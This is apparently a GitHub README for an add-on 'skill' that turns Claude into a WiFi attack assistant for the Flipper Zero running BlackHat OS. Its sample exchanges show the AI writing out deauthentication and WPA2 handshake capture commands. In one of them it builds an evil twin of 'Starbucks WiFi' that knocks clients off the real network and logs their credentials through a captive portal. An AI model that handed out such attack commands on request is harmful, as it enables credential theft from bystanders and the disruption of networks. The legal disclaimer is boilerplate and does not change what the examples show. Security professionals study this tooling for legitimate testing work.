# Flipper Zero BlackHat Pentesting Skill

A comprehensive Claude AI skill for WiFi penetration testing with the Flipper Zero WiFi Dev Board running BlackHat OS.

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This skill provides guidance for professional penetration testing and security research. You must have:
- **Written authorization** from network owners
- **Legal right** to test target systems  
- **Understanding** of local laws regarding computer security testing

Unauthorized access to computer networks is illegal in most jurisdictions. Users are solely responsible for ensuring their testing is authorized and legal.

## 🎯 What This Skill Does

Enables Claude to assist with:
- **WiFi Reconnaissance**: Passive & active network scanning with Kismet, airodump-ng
- **Attack Planning**: End-to-end attack chain strategy
- **BlackHat OS Commands**: Expert guidance on the `bh` CLI tool
- **Script Generation**: Custom bash scripts for automated testing
- **Troubleshooting**: Debug interface issues, failed captures, etc.
- **Educational Explanations**: 802.11 protocol, WPA2 handshakes, attack theory

## 🚀 Installation

### For Claude Desktop / API

```bash
# Clone into your skills directory
cd /path/to/mcp_server_files/skills/user/
git clone https://github.com/[your-username]/flipper-blackhat-skill
```

### For Claude.ai Web

1. Upload `SKILL.md` as a Project Knowledge file
2. Optionally upload documentation files from `docs/` for enhanced context

## 📁 Structure

```
flipper-blackhat-skill/
├── SKILL.md                          # Main skill instructions for Claude
├── README.md                         # This file
├── docs/
│   └── wifi/
│       ├── passive-recon.md         # Kismet, scanning, monitoring
│       ├── active-recon.md          # Deauth, handshakes, MAC spoofing  
│       └── attack-scenarios.md      # Evil Twin, MITM, WPA cracking
├── reference/
│   └── blackhat-os-reference.md     # Complete bh command reference
└── examples/                         # (Future: example scripts)
    ├── wifi-scripts/
    ├── badusb-payloads/
    └── sub-ghz-signals/
```

## 🔧 Hardware Requirements

- **Flipper Zero** with WiFi Dev Board
- **BlackHat OS** installed ([flipper-blackhat-os](https://github.com/o7-machinehum/flipper-blackhat-os))
- **Dual WiFi interfaces** (wlan0 onboard + wlan1 USB dongle recommended)

## 💡 Usage Examples

### Example 1: WPA2 Handshake Capture

**User**: "How do I capture a WPA2 handshake?"

**Claude** (with this skill):
```bash
# 1. Connect SSH via wlan0
bh set SSID "YourNetwork"
bh set PASS "password"
bh wifi con wlan0

# 2. Scan for targets
bh deauth_scan wlan1

# 3. Start capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan1

# 4. Force handshake (new terminal)
bh deauth 11:22:33:44:55:66 AA:BB:CC:DD:EE:FF wlan1 50

# 5. Verify
aircrack-ng handshake-01.cap
```

### Example 2: Evil Twin Setup

**User**: "Create an evil twin for 'Starbucks WiFi'"

**Claude**:
```bash
# Configure
bh set AP_SSID "Starbucks WiFi"

# Force clients to disconnect from real AP
bh deauth_all <REAL_AP_MAC> wlan1

# Deploy captive portal
bh evil_portal

# Monitor captured credentials
tail -f /var/log/evil_portal.log
```

### Example 3: Custom Script Generation

**User**: "Script to auto-capture handshakes from all nearby networks"

**Claude**: [Generates full bash script with error handling, logging, and cleanup]

## 🛠️ Key Features

### BlackHat OS Integration
- Complete `bh` command reference
- Hardware-aware (dual-radio wlan0/wlan1 guidance)
- Troubleshooting patterns for common issues

### Attack Chain Planning
Thinks holistically about multi-stage attacks:
1. Reconnaissance → 2. Active Recon → 3. Exploitation → 4. Post-Exploitation

### Professional Workflows
- Maintains SSH stability (wlan0 for SSH, wlan1 for attacks)
- Proper interface management
- Capture verification and transfer
- PC-side GPU cracking integration

### Educational Context
Explains *why* attacks work, not just *how*:
- 802.11 management frame weaknesses
- WPA2 4-way handshake structure  
- PBKDF2 and cracking complexity
- Detection and defense mechanisms

## 📚 Documentation Coverage

### WiFi Pentesting (Complete)
- **Passive Reconnaissance**: Kismet, airodump-ng, 802.11 frame analysis
- **Active Reconnaissance**: Deauth attacks, handshake capture, MAC spoofing, nmap
- **Attack Scenarios**: WPA2 cracking, Evil Twin, MITM, credential harvesting, WPS attacks

### Future Modules (Planned)
- Bluetooth/BLE pentesting
- NFC/RFID attacks
- Sub-GHz signal analysis
- BadUSB payload development

## 🤝 Contributing

Contributions welcome! Areas for expansion:
- Example scripts (`examples/`)
- Additional attack modules (BLE, NFC, Sub-GHz)
- Troubleshooting patterns
- Defense testing workflows

## 📖 Learning Resources

- [Flipper Zero Docs](https://docs.flipperzero.one/)
- [BlackHat OS GitHub](https://github.com/o7-machinehum/flipper-blackhat-os)
- [Kismet Documentation](https://www.kismetwireless.net/docs/)
- [Aircrack-ng Tutorial](https://www.aircrack-ng.org/documentation.html)

## 🔗 Related Projects

- [flipper-blackhat-os](https://github.com/o7-machinehum/flipper-blackhat-os) - Base OS for Flipper WiFi Dev Board
- [aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) - WiFi security auditing tools
- [bettercap](https://github.com/bettercap/bettercap) - Network attack and monitoring framework

## 📄 License

MIT License - See LICENSE file

## ⚖️ Responsible Disclosure

If you discover vulnerabilities while using this skill for authorized testing, follow responsible disclosure practices:
1. Report to affected vendor/owner
2. Allow time for patches (90 days standard)
3. Coordinate public disclosure timing

## 🙏 Acknowledgments

- WiFi documentation based on professional pentesting experience
- BlackHat OS by [o7-machinehum](https://github.com/o7-machinehum)
- Flipper Zero community for hardware development

---

**Remember**: With great power comes great responsibility. Test ethically. Test legally. Test professionally.
